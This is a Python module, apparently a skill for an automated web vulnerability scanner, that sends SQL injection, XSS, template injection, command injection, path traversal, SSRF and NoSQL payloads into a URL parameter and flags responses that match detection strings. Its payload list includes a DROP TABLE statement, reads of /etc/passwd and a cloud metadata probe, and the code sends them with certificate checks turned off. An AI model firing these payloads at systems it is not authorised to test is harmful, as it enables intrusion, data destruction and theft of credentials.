"""Skill: test_injection — SQLi/XSS/SSTI/CMDi on a URL+parameter."""
from __future__ import annotations
import asyncio
import logging
import re
from typing import Any
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

logger = logging.getLogger(__name__)

# Payloads grouped by type with detection signatures
PAYLOADS: list[dict] = [
    # SQL Injection — error-based
    {"type": "sqli", "payload": "'", "detect": ["sql", "sqlite", "mysql", "postgres", "syntax error", "ORA-", "unclosed quotation"]},
    {"type": "sqli", "payload": "' OR 1=1--", "detect": ["sql"]},
    {"type": "sqli", "payload": "1' ORDER BY 100--", "detect": ["sql", "order"]},
    {"type": "sqli", "payload": "' UNION SELECT NULL--", "detect": ["sql"]},
    {"type": "sqli", "payload": "1; DROP TABLE test--", "detect": ["sql"]},
    {"type": "sqli", "payload": "' AND 1=CONVERT(int,(SELECT @@version))--", "detect": ["convert", "sql"]},
    {"type": "sqli", "payload": "' AND (SELECT * FROM (SELECT(SLEEP(2)))a)--", "detect": []},  # time-based
    # SQL Injection — blind (response size diff)
    {"type": "sqli_blind", "payload": "' AND '1'='1", "detect": []},
    {"type": "sqli_blind", "payload": "' AND '1'='2", "detect": []},
    # XSS — reflected
    {"type": "xss", "payload": "<script>alert(1)</script>", "detect": ["<script>alert(1)</script>"]},
    {"type": "xss", "payload": "<img src=x onerror=alert(1)>", "detect": ["onerror=alert"]},
    {"type": "xss", "payload": "<iframe src=javascript:alert(1)>", "detect": ["<iframe"]},
    {"type": "xss", "payload": "\"><script>alert(1)</script>", "detect": ["<script>"]},
    {"type": "xss", "payload": "'-alert(1)-'", "detect": ["alert(1)"]},
    {"type": "xss", "payload": "<svg onload=alert(1)>", "detect": ["<svg"]},
    {"type": "xss", "payload": "{{7*7}}", "detect": ["49"]},  # also SSTI
    # SSTI
    {"type": "ssti", "payload": "${7*7}", "detect": ["49"]},
    {"type": "ssti", "payload": "{{config}}", "detect": ["SECRET_KEY", "config"]},
    {"type": "ssti", "payload": "<%= 7*7 %>", "detect": ["49"]},
    {"type": "ssti", "payload": "{%import os%}{{os.popen('id').read()}}", "detect": ["uid="]},
    # Command Injection
    {"type": "cmdi", "payload": ";id", "detect": ["uid="]},
    {"type": "cmdi", "payload": "|id", "detect": ["uid="]},
    {"type": "cmdi", "payload": "`id`", "detect": ["uid="]},
    {"type": "cmdi", "payload": "$(id)", "detect": ["uid="]},
    {"type": "cmdi", "payload": ";cat /etc/passwd", "detect": ["root:"]},
    # Path Traversal
    {"type": "path_traversal", "payload": "../../etc/passwd", "detect": ["root:"]},
    {"type": "path_traversal", "payload": "....//....//etc/passwd", "detect": ["root:"]},
    {"type": "path_traversal", "payload": "%2e%2e%2f%2e%2e%2fetc/passwd", "detect": ["root:"]},
    # SSRF
    {"type": "ssrf", "payload": "http://localhost/", "detect": []},
    {"type": "ssrf", "payload": "http://169.254.169.254/latest/meta-data/", "detect": ["ami-", "instance"]},
    # NoSQL
    {"type": "nosql", "payload": "{'$ne': null}", "detect": []},
    {"type": "nosql", "payload": "[$ne]=1", "detect": []},
]


async def execute(url: str, param_name: str | None = None, **kwargs: Any) -> dict[str, Any]:
    """Test injection on a URL with query parameter.

    If url contains ?param=value, tests on that param.
    If param_name given, injects into that specific param.

    Returns:
        {
            "vulnerable": bool,
            "findings": [{"type": "sqli", "payload": "...", "evidence": "...", "severity": "..."}, ...],
            "tested": int,
            "url": str,
        }
    """
    import httpx

    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)

    # Find target parameter
    if param_name and param_name in params:
        target_param = param_name
    elif params:
        target_param = list(params.keys())[0]
    else:
        # No query param — try common ones
        target_param = "q"
        params = {"q": [""]}
        parsed = parsed._replace(query="q=")

    # Get baseline response
    async with httpx.AsyncClient(timeout=10, verify=False) as c:
        try:
            base_r = await c.get(url)
            baseline_status = base_r.status_code
            baseline_size = len(base_r.content)
            baseline_body = base_r.text.lower()
        except Exception as e:
            return {"vulnerable": False, "findings": [], "tested": 0, "url": url, "error": str(e)}

        findings: list[dict] = []
        blind_sizes: dict[str, int] = {}
        tested = 0

        sem = asyncio.Semaphore(10)

        async def test_payload(p: dict) -> None:
            nonlocal tested
            async with sem:
                tested += 1
                new_params = dict(params)
                original_val = new_params[target_param][0] if new_params[target_param] else ""
                new_params[target_param] = [original_val + p["payload"]]
                query = urlencode({k: v[0] for k, v in new_params.items()})
                test_url = urlunparse(parsed._replace(query=query))

                try:
                    r = await c.get(test_url, timeout=10)
                except Exception:
                    return

                body = r.text.lower()
                size = len(r.content)

                # Track blind SQLi size differences
                if p["type"] == "sqli_blind":
                    blind_sizes[p["payload"]] = size
                    return

                # Check for error-based detection
                for sig in p["detect"]:
                    if sig.lower() in body:
                        severity = {
                            "sqli": "critical", "xss": "high", "ssti": "critical",
                            "cmdi": "critical", "path_traversal": "high",
                            "ssrf": "high", "nosql": "high",
                        }.get(p["type"], "medium")

                        findings.append({
                            "type": p["type"],
                            "payload": p["payload"],
                            "param": target_param,
                            "evidence": f"Status {r.status_code}, matched '{sig}' in response",
                            "response_preview": r.text[:300],
                            "severity": severity,
                        })
                        logger.info("injection found: %s on %s with %s", p["type"], target_param, p["payload"][:30])
                        return

                # Check for interesting status code changes
                if r.status_code == 500 and baseline_status != 500:
                    findings.append({
                        "type": p["type"],
                        "payload": p["payload"],
                        "param": target_param,
                        "evidence": f"Payload caused 500 error (baseline was {baseline_status})",
                        "response_preview": r.text[:300],
                        "severity": "medium",
                    })

                # Check for XSS reflection
                if p["type"] == "xss" and p["payload"].lower() in body:
                    findings.append({
                        "type": "xss_reflected",
                        "payload": p["payload"],
                        "param": target_param,
                        "evidence": "Payload reflected in response body",
                        "response_preview": r.text[:300],
                        "severity": "high",
                    })

        await asyncio.gather(*[test_payload(p) for p in PAYLOADS])

        # Analyze blind SQLi
        if len(blind_sizes) >= 2:
            sizes = list(blind_sizes.values())
            if max(sizes) - min(sizes) > 50:
                findings.append({
                    "type": "sqli_blind",
                    "payload": "boolean-based blind",
                    "param": target_param,
                    "evidence": f"Response size delta: {dict(blind_sizes)}",
                    "severity": "critical",
                })

    # Deduplicate findings by type
    seen_types: set[str] = set()
    unique_findings: list[dict] = []
    for f in findings:
        key = f"{f['type']}:{f['param']}"
        if key not in seen_types:
            seen_types.add(key)
            unique_findings.append(f)

    return {
        "vulnerable": len(unique_findings) > 0,
        "findings": unique_findings,
        "tested": tested,
        "url": url,
        "param": target_param,
    }
